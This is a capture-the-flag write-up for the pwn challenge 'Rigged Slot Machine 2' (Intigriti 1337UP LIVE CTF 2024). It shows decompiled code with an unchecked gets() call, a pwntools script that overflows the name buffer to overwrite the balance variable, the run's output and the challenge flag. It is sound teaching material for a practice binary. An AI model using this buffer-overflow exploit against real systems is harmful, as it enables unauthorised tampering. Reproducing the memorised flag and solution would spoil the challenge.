---
name: Rigged Slot Machine 2 (2024)
event: Intigriti 1337UP LIVE CTF 2024
category: Pwn
description: Writeup for Rigged Slot Machine 2 (Pwn) - 1337UP LIVE CTF (2024) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Rigged Slot Machine (part 2)

## Video walkthrough

[![VIDEO](https://img.youtube.com/vi/ZKtRuZMqo2o/0.jpg)](https://youtu.be/ZKtRuZMqo2o "Buffer Overflow: Overwriting Stack Variables and Basic Python Scripting")

## Challenge Description

> The casino fixed their slot machine algorithm - good luck hitting that jackpot now!

I mentioned that part 1 of this challenge was an unintended solution I caught before the CTF, so here's what I actually intended to make 😅

## Solution

We don't know what the winning condition is yet but since it's a pwn challenges, let's check the binary protections.

{% code overflow="wrap" %}

```bash
checksec --file rigged_slot2
[*] '/home/crystal/Desktop/challs/pwn/RiggedSlotMachine2/solution/rigged_slot2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

{% endcode %}

No canaries, so potentially a buffer overflow for us to exploit. We'll check the disassembled code in `ghidra` soon. First, let's run the binary and see if it looks different to part 1.

{% code overflow="wrap" %}

```bash
nc localhost 1337
Welcome to the Rigged Slot Machine!
You start with $100. Can you beat the odds?
Enter your name:
cat
Welcome, cat!

Enter your bet amount (up to $100 per spin): 10
You lost $10.
Current Balance: $90

Enter your bet amount (up to $100 per spin): 10
You lost $10.
Current Balance: $80

Enter your bet amount (up to $100 per spin): 10
You lost $10.
Current Balance: $70

Enter your bet amount (up to $100 per spin): 50
You lost $50.
Current Balance: $20

Enter your bet amount (up to $100 per spin): 20
You lost $20.
Current Balance: $0
You're out of money! Game over!
```

{% endcode %}

It looks similar, apart from the `name` entry at the beginning and the terrible odds (try your brute force script from part 1 if you like).

I've renamed some of the variables in `ghidra`.

{% code overflow="wrap" %}

```c
setup_alarm(5);
balance = 100;
puts("Welcome to the Rigged Slot Machine!");
puts("You start with $100. Can you beat the odds?");
enter_name(name);
do {
while( true ) {
  while( true ) {
	bet = 0;
	printf("\nEnter your bet amount (up to $%d per spin): ",100);
	user_input = __isoc99_scanf(&%d,&bet);
	if (user_input == 1) break;
	puts("Invalid input! Please enter a numeric value.");
	clear_input();
  }
  if ((bet < 1) || (100 < bet)) break;
  if ((int)balance < bet) {
	printf("You cannot bet more than your Current Balance: $%d\n",(ulong)balance);
  }
  else {
	play(bet,&balance);
	if (balance == 1337420) {
	  payout(&balance);
	}
  }
}
printf("Invalid bet amount! Please bet an amount between $1 and $%d.\n",100);
} while( true );
```

{% endcode %}

Similar to last time, but we need to hit a balance of `$1,337,420` within the 5 minute time limit (I might of reduced to 2-3 mins, can't remember). Checking the odds, they are terrible 😫

{% code overflow="wrap" %}

```c
outcome = rand();
outcome = outcome % 1000;
if (outcome == 0) {
  multiplier = 10;
}
else if (outcome < 5) {
  multiplier = 5;
}
else if (outcome < 10) {
  multiplier = 3;
}
else if (outcome < 15) {
  multiplier = 2;
}
else if (outcome < 30) {
  multiplier = 1;
}
else {
  multiplier = 0;
}
```

{% endcode %}

Soooo.. Back to this buffer overflow! The `name` buffer shows as 20 bytes in ghidra, but there is no limit to how much the user can provide (dangerous `gets()` function).

{% code overflow="wrap" %}

```c
void enter_name(char *name)
{
  puts("Enter your name:");
  gets(name);
  printf("Welcome, %s!\n",name);
  return;
}
```

{% endcode %}

Let's test this! Enter a long string (over 20) as the name and play some games.

{% code overflow="wrap" %}

```bash
nc localhost 1337
Welcome to the Rigged Slot Machine!
You start with $100. Can you beat the odds?
Enter your name:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!

Enter your bet amount (up to $100 per spin): 10
You lost $10.
Current Balance: $1094795575

Enter your bet amount (up to $100 per spin): 10
You lost $10.
Current Balance: $1094795565

Enter your bet amount (up to $100 per spin): 10
You lost $10.
Current Balance: $1094795555
```

{% endcode %}

That's a lot of money!! We overwrite the balance on the stack 😌 We need exactly `1337420` though, let's automate it into a script.

### solve.py

{% code overflow="wrap" %}

```python
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './rigged_slot2'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()

payload = b'A' * 20 + p32(1337421)

io.sendlineafter(b"Enter your name:", payload)

io.interactive()
```

{% endcode %}

Give it a run ✅

{% code overflow="wrap" %}

```bash
python solve.py REMOTE 127.0.0.1 1337
[+] Opening connection to 127.0.0.1 on port 1337: Done
[DEBUG] Received 0x64 bytes:
    b'Welcome to the Rigged Slot Machine!\r\n'
    b'You start with $100. Can you beat the odds?\r\n'
    b'Enter your name:\r\n'
[DEBUG] Sent 0x19 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  4d 68 14 00  0a                        │AAAA│Mh··│·│
    00000019
[*] Switching to interactive mode

[DEBUG] Received 0x52 bytes:
    00000000  57 65 6c 63  6f 6d 65 2c  20 41 41 41  41 41 41 41  │Welc│ome,│ AAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 4d 68 14  │AAAA│AAAA│AAAA│AMh·│
    00000020  21 0d 0a 0d  0a 45 6e 74  65 72 20 79  6f 75 72 20  │!···│·Ent│er y│our │
    00000030  62 65 74 20  61 6d 6f 75  6e 74 20 28  75 70 20 74  │bet │amou│nt (│up t│
    00000040  6f 20 24 31  30 30 20 70  65 72 20 73  70 69 6e 29  │o $1│00 p│er s│pin)│
    00000050  3a 20                                               │: │
    00000052


Enter your bet amount (up to $100 per spin): $ 1
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0xaa bytes:
    b'You lost $1.\r\n'
    b'Current Balance: $1337420\r\n'
    b"Congratulations! You've won the jackpot! Here is your flag: INTIGRITI{fake_flag}\r\n"
```

{% endcode %}

Flag: `INTIGRITI{1_w15h_17_w45_7h15_345y_1n_v3645}`
